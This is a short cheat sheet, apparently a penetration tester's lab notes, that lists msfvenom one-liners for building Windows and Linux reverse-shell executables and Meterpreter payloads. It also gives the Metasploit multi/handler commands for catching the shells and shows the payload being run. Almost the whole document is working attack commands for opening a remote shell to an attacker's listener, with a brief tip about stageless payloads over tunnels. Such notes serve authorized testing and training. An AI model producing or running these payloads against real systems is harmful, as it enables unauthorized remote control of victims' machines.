Compiling some one liners that can be used.

also note revshell online is pretty good.

Basic format (windows)
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=<listen_port> -f exe -o shell.exe
```

Basic format (linux)
```bash
# use to create .elf files (linux executables) -- kinda rare/niche use case
msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=<listen_port> -f elf -o shell.elf
```

Meterpreter Rev shell
```bash
# Create linux rev shell
msfvenom -p linux/meterpreter/reverse_tcp LHOST=<listen_ip> -f elf -o shell LPORT=8080
# Create windows rev shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<listen_ip> -f exe -o shell.exe LPORT=8080

# Start listener
msfconsole
use exploit/multi/handler
set LHOST tun0
set LPORT 8080
set payload <OS>/meterpreter/reverse_tcp
set PAYLOAD <OS>/meterpreter_reverse_tcp # stageless alternative...
run

# Fire rev shell
chmod +x shell
./shell
```
if we are doing this through a tunnel (ie ligolo, we might need a stageless payload)